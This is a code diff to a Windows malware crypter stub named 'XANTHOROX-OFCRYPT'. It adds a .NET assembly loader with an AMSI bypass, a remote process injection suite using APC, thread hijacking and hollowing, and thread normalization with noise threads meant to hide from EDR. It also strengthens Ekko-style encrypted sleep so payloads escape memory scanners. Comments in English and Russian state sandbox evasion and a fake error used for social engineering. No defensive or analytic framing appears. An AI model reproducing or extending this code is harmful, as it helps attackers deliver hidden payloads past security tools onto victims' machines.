@@ -38,6 +38,9 @@
 #include "DarknetDecrypt.h"
 #include "VoidDecrypt.h"
 #include "AntiMemScan.h"
+#include "ThreadNormalizer.h"
+#include "Injection.h"
+#include "DotNetLoader.h"
 
 // ═══════════════════════════════════════════════════════════════
 //  XANTHOROX-OFCRYPT STUB | CONFIGURATION BLOCK
@@ -248,9 +251,11 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
     // ── Step 4: Sleep Obfuscation (initial delay to outlast sandboxes) ──
     if (GlobalConfig.bEkkoSleep) {
-        // 8-second encrypted sleep — payload stays encrypted in memory
-        // so scanners can't find it during the delay
-        SleepObf::EncryptedSleep(EncryptedPayload, PayloadSize, 8000);
+        // Ekko sleep: full memory + heap encryption during sleep.
+        // ChaCha20 encrypts ALL executable private regions + heap blocks.
+        // EXECUTE removed from all regions. Memory scanners see only
+        // PAGE_READWRITE with ciphertext. Timer callback decrypts on wake.
+        SleepObf::EkkoSleep(EncryptedPayload, PayloadSize, 8000);
     }
 
     // ── Step 5: Fake Error (Social Engineering) ──
@@ -363,9 +368,26 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     }
 
     // ── Step 9: Execute Payload ──
-    // Порядок приоритета: Phantom(L1) > ThreadPool(L2) > ThreadNorm(L2) >
-    //   ModuleStomp > RunPE > CallbackDiv(L2) > Fibers > default
-    if (GlobalConfig.bPhantomDLL) {
+    // Порядок приоритета: DotNet > RemoteInjection > Phantom(L1) >
+    //   ThreadPool(L2) > ThreadNorm(L2) > ModuleStomp > RunPE >
+    //   CallbackDiv(L2) > Fibers > default
+    // .NET loading имеет высший приоритет — автоопределение по COM_DESCRIPTOR
+
+    if (GlobalConfig.bDotNetLoading && DotNetLoader::IsDotNetAssembly(EncryptedPayload, decryptSize)) {
+        // .NET Assembly Loading — Method A: temp file + CLR AMSI bypass
+        // ExecuteInDefaultAppDomain → немедленный NtDeleteFile
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        DotNetLoader::LoadAndExecute(EncryptedPayload, decryptSize);
+    }
+    else if (GlobalConfig.bRemoteInjection) {
+        // Remote Injection Suite — 5 методов инъекции в удалённый процесс
+        // Секция 7: SectionMap, APC, ThreadHijack, Hollowing+, CallbackEnum
+        if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
+        else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
+        Injection::Execute(EncryptedPayload, decryptSize, 0);
+    }
+    else if (GlobalConfig.bPhantomDLL) {
         // Layer 1: Phantom DLL Hollowing — execute from signed DLL memory
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
@@ -378,12 +400,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
         ThreadPool::Execute(EncryptedPayload, decryptSize);
     }
     else if (GlobalConfig.bThreadNormalization) {
-        // Layer 2: Thread Origin Normalization — автороутинг через ThreadPool
-        // Поток стартует из ntdll (TpAllocWork callback), EDR не видит
-        // подозрительный thread start address в нашем .exe
+        // Layer 2: Thread Behavior Normalization — callback rotation + jitter + noise
+        // Поток стартует через TpAllocWork/TimerQueue/APC rotation, EDR не видит
+        // предсказуемый thread start address. Jittered sleep, background noise threads.
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
         else if (GlobalConfig.bGuardPage) GuardPage::Uninstall();
-        ThreadPool::Execute(EncryptedPayload, decryptSize);
+        ThreadNormalizer::CreateNoiseThreads();
+        ThreadNormalizer::ExecuteWithNormalizedCallback(EncryptedPayload, decryptSize);
+        ThreadNormalizer::StopNoiseThreads();
     }
     else if (GlobalConfig.bModuleStomp) {
         if (GlobalConfig.bAntiMemScan) AntiMemScan::Disable();
